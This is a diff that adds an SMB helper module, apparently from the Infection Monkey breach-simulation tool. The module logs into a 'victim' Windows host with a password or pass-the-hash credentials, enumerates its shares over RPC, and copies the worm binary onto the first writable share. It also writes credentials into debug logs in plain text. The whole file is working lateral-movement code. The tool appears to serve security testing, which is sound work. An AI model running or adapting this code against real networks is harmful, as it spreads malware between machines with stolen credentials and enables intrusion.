+++ monkey/infection_monkey/exploit/tools/smb_tools.py
@@ -1,0 +1,216 @@
+import logging
+import ntpath
+import pprint
+
+from impacket.dcerpc.v5 import transport, srvs
+from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
+from impacket.smbconnection import SMBConnection, SMB_DIALECT
+
+import infection_monkey.config
+import infection_monkey.monkeyfs as monkeyfs
+from common.utils.attack_utils import ScanStatus
+from infection_monkey.telemetry.attack.t1105_telem import T1105Telem
+
+__author__ = 'itamar'
+
+LOG = logging.getLogger(__name__)
+
+
+class SmbTools(object):
+
+    @staticmethod
+    def copy_file(host, src_path, dst_path, username, password, lm_hash='', ntlm_hash='', timeout=60):
+        assert monkeyfs.isfile(src_path), "Source file to copy (%s) is missing" % (src_path,)
+        config = infection_monkey.config.WormConfiguration
+        src_file_size = monkeyfs.getsize(src_path)
+
+        smb, dialect = SmbTools.new_smb_connection(host, username, password, lm_hash, ntlm_hash, timeout)
+        if not smb:
+            return None
+
+        # skip guest users
+        if smb.isGuestSession() > 0:
+            LOG.debug("Connection to %r granted guest privileges with user: %s, password: '%s',"
+                      " LM hash: %s, NTLM hash: %s",
+                      host, username, password, lm_hash, ntlm_hash)
+
+            try:
+                smb.logoff()
+            except:
+                pass
+
+            return None
+
+        try:
+            resp = SmbTools.execute_rpc_call(smb, "hNetrServerGetInfo", 102)
+        except Exception as exc:
+            LOG.debug("Error requesting server info from %r over SMB: %s",
+                      host, exc)
+            return None
+
+        info = {'major_version': resp['InfoStruct']['ServerInfo102']['sv102_version_major'],
+                'minor_version': resp['InfoStruct']['ServerInfo102']['sv102_version_minor'],
+                'server_name': resp['InfoStruct']['ServerInfo102']['sv102_name'].strip("\0 "),
+                'server_comment': resp['InfoStruct']['ServerInfo102']['sv102_comment'].strip("\0 "),
+                'server_user_path': resp['InfoStruct']['ServerInfo102']['sv102_userpath'].strip("\0 "),
+                'simultaneous_users': resp['InfoStruct']['ServerInfo102']['sv102_users']}
+
+        LOG.debug("Connected to %r using %s:\n%s",
+                  host, dialect, pprint.pformat(info))
+
+        try:
+            resp = SmbTools.execute_rpc_call(smb, "hNetrShareEnum", 2)
+        except Exception as exc:
+            LOG.debug("Error enumerating server shares from %r over SMB: %s",
+                      host, exc)
+            return None
+
+        resp = resp['InfoStruct']['ShareInfo']['Level2']['Buffer']
+
+        high_priority_shares = ()
+        low_priority_shares = ()
+        file_name = ntpath.split(dst_path)[-1]
+
+        for i in range(len(resp)):
+            share_name = resp[i]['shi2_netname'].strip("\0 ")
+            share_path = resp[i]['shi2_path'].strip("\0 ")
+            current_uses = resp[i]['shi2_current_uses']
+            max_uses = resp[i]['shi2_max_uses']
+
+            if current_uses >= max_uses:
+                LOG.debug("Skipping share '%s' on victim %r because max uses is exceeded",
+                          share_name, host)
+                continue
+            elif not share_path:
+                LOG.debug("Skipping share '%s' on victim %r because share path is invalid",
+                          share_name, host)
+                continue
+
+            share_info = {'share_name': share_name,
+                          'share_path': share_path}
+
+            if dst_path.lower().startswith(share_path.lower()):
+                high_priority_shares += ((ntpath.sep + dst_path[len(share_path):], share_info),)
+
+            low_priority_shares += ((ntpath.sep + file_name, share_info),)
+
+        shares = high_priority_shares + low_priority_shares
+
+        file_uploaded = False
+        for remote_path, share in shares:
+            share_name = share['share_name']
+            share_path = share['share_path']
+
+            if not smb:
+                smb, _ = SmbTools.new_smb_connection(host, username, password, lm_hash, ntlm_hash, timeout)
+                if not smb:
+                    return None
+
+            try:
+                tid = smb.connectTree(share_name)
+            except Exception as exc:
+                LOG.debug("Error connecting tree to share '%s' on victim %r: %s",
+                          share_name, host, exc)
+                continue
+
+            LOG.debug("Trying to copy monkey file to share '%s' [%s + %s] on victim %r",
+                      share_name, share_path, remote_path, host.ip_addr[0], )
+
+            remote_full_path = ntpath.join(share_path, remote_path.strip(ntpath.sep))
+
+            # check if file is found on destination
+            if config.skip_exploit_if_file_exist:
+                try:
+                    file_info = smb.listPath(share_name, remote_path)
+                    if file_info:
+                        if src_file_size == file_info[0].get_filesize():
+                            LOG.debug("Remote monkey file is same as source, skipping copy")
+                            return remote_full_path
+
+                        LOG.debug("Remote monkey file is found but different, moving along with attack")
+                except:
+                    pass  # file isn't found on remote victim, moving on
+
+            try:
+                with monkeyfs.open(src_path, 'rb') as source_file:
+                    # make sure of the timeout
+                    smb.setTimeout(timeout)
+                    smb.putFile(share_name, remote_path, source_file.read)
+
+                file_uploaded = True
+                T1105Telem(ScanStatus.USED, host.ip_addr[0], dst_path).send()
+                LOG.info("Copied monkey file '%s' to remote share '%s' [%s] on victim %r",
+                         src_path, share_name, share_path, host)
+
+                break
+            except Exception as exc:
+                LOG.debug("Error uploading monkey to share '%s' on victim %r: %s",
+                          share_name, host, exc)
+                T1105Telem(ScanStatus.SCANNED, host.ip_addr[0], dst_path).send()
+                continue
+            finally:
+                try:
+                    smb.logoff()
+                except:
+                    pass
+
+                smb = None
+
+        if not file_uploaded:
+            LOG.debug("Couldn't find a writable share for exploiting"
+                      " victim %r with username: %s, password: '%s', LM hash: %s, NTLM hash: %s",
+                      host, username, password, lm_hash, ntlm_hash)
+            return None
+
+        return remote_full_path
+
+    @staticmethod
+    def new_smb_connection(host, username, password, lm_hash='', ntlm_hash='', timeout=60):
+        try:
+            smb = SMBConnection(host.ip_addr, host.ip_addr, sess_port=445)
+        except Exception as exc:
+            LOG.debug("SMB connection to %r on port 445 failed,"
+                      " trying port 139 (%s)", host, exc)
+
+            try:
+                smb = SMBConnection('*SMBSERVER', host.ip_addr, sess_port=139)
+            except Exception as exc:
+                LOG.debug("SMB connection to %r on port 139 failed as well (%s)",
+                          host, exc)
+                return None, None
+
+        dialect = {SMB_DIALECT: "SMBv1",
+                   SMB2_DIALECT_002: "SMBv2.0",
+                   SMB2_DIALECT_21: "SMBv2.1"}.get(smb.getDialect(), "SMBv3.0")
+
+        # we know this should work because the WMI connection worked
+        try:
+            smb.login(username, password, '', lm_hash, ntlm_hash)
+        except Exception as exc:
+            LOG.debug("Error while logging into %r using user: %s, password: '%s', LM hash: %s, NTLM hash: %s: %s",
+                      host, username, password, lm_hash, ntlm_hash, exc)
+            return None, dialect
+
+        smb.setTimeout(timeout)
+        return smb, dialect
+
+    @staticmethod
+    def execute_rpc_call(smb, rpc_func, *args):
+        dce = SmbTools.get_dce_bind(smb)
+        rpc_method_wrapper = getattr(srvs, rpc_func, None)
+        if not rpc_method_wrapper:
+            raise ValueError("Cannot find RPC method '%s'" % (rpc_method_wrapper,))
+
+        return rpc_method_wrapper(dce, *args)
+
+    @staticmethod
+    def get_dce_bind(smb):
+        rpctransport = transport.SMBTransport(smb.getRemoteHost(),
+                                              smb.getRemoteHost(),
+                                              filename=r'\srvsvc',
+                                              smb_connection=smb)
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(srvs.MSRPC_UUID_SRVS)
+
+        return dce
